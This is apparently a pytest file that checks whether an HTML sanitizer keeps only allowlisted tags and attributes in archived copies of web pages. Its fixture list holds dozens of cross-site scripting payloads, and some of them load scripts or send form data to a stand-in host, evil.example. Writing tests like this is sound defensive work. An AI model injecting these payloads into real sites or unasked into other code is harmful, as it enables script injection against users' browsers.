"""A saved copy may contain nothing but the allowlist, whatever the page did.

`test_saved_copies.py` checks particular markup. This checks the rule itself:
every tag and every attribute that survives is one the allowlist names, for a
corpus of markup written to get past it.
"""

from html.parser import HTMLParser
from urllib.parse import urlsplit

import pytest

from markfind.archive import render
from markfind.extract import _READER_TAGS, extract_text

BASE = "https://victim.example/article"
PROSE = " ".join(f"word{i}" for i in range(60))

ALLOWED_TAGS = set(_READER_TAGS.values())
ALLOWED_ATTRS = {"a": {"href"}, "td": {"colspan", "rowspan"}, "th": {"colspan", "rowspan"}}

PAYLOADS = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<scr<script>ipt>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<object data=javascript:alert(1)>",
    "<embed src=//evil.example/x.swf>",
    "<form action=//evil.example><input name=x value=secret></form>",
    "<style>body{background:url(javascript:alert(1))}</style>",
    "<link rel=stylesheet href=//evil.example/x.css>",
    "<meta http-equiv=refresh content='0;url=//evil.example/'>",
    "<base href='//evil.example/'>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<template><script>alert(1)</script></template>",
    "<a href='javascript:alert(1)'>click</a>",
    "<a href='JaVaScRiPt:alert(1)'>click</a>",
    "<a href='java\tscript:alert(1)'>click</a>",
    "<a href=' javascript:alert(1)'>click</a>",
    "<a href='data:text/html,<script>alert(1)</script>'>click</a>",
    "<a href='vbscript:msgbox(1)'>click</a>",
    "<a href='https://ok.example/\" onmouseover=\"alert(1)'>click</a>",
    "<a href='https://ok.example/' onclick='alert(1)'>click</a>",
    '<p title="a" onmouseover="alert(1)">text</p>',
    "<td colspan='2\" onmouseover=\"alert(1)'>cell</td>",
    "<td colspan='1 onmouseover=alert(1)'>cell</td>",
    '<p>" onload="alert(1)</p>',
    "<p>'><script>alert(1)</script></p>",
    "<!--<script>alert(1)</script>-->",
    "<![CDATA[<script>alert(1)</script>]]>",
    "<xmp><script>alert(1)</script></xmp>",
    "<noscript><script>alert(1)</script></noscript>",
    "<plaintext><script>alert(1)</script>",
    "<p/onmouseover=alert(1)>x</p>",
    "<p\x00 onmouseover=alert(1)>x</p>",
]


class Tags(HTMLParser):
    """Every start tag in a fragment, with its attributes."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.found: list[tuple[str, list[tuple[str, str | None]]]] = []

    def handle_starttag(self, tag, attrs):
        self.found.append((tag, attrs))

    handle_startendtag = handle_starttag


def tags_in(html: str):
    parser = Tags()
    parser.feed(html)
    parser.close()
    return parser.found


def copy_of(payload: str) -> str:
    markup = f"<html><body><main><p>{PROSE}</p>{payload}<p>{PROSE}</p></main></body></html>"
    return extract_text(markup, base_url=BASE).html


@pytest.mark.parametrize("payload", PAYLOADS)
def test_only_the_allowlist_survives(payload):
    for tag, attrs in tags_in(copy_of(payload)):
        assert tag in ALLOWED_TAGS, f"{tag} is not in the allowlist"
        for name, value in attrs:
            assert name in ALLOWED_ATTRS.get(tag, set()), f"<{tag} {name}=> should be dropped"
            if name == "href":
                assert urlsplit(value or "").scheme in ("http", "https")
            else:  # colspan, rowspan
                assert (value or "").isascii() and (value or "").isdigit()


@pytest.mark.parametrize("payload", PAYLOADS)
def test_the_served_page_carries_nothing_extra(payload):
    """The shell adds a <style>; the page's own content must add nothing."""
    whole = render(BASE, "Title", "2026-11-12T00:00:00+00:00", copy_of(payload), text_only=False)
    body = whole.split("</head>", 1)[1]
    for tag, attrs in tags_in(body):
        assert tag in ALLOWED_TAGS | {"body", "html", "header", "main", "h1", "p", "a", "time"}
        assert all(name in {"href", "colspan", "rowspan", "class", "datetime"} for name, _ in attrs)
    assert "<script" not in whole.lower()


def test_spans_must_be_plain_numbers():
    # str.isdigit() is true of "²" and of Arabic-Indic digits, which are not
    # valid span values; only ASCII digits are kept.
    for value in ("²", "٣", "½", " 2", "2.0", "-1", ""):
        assert f'colspan="{value}"' not in copy_of(f"<table><tr><td colspan='{value}'>cell</td>")
    assert 'colspan="3"' in copy_of("<table><tr><td colspan='3'>cell</td>")
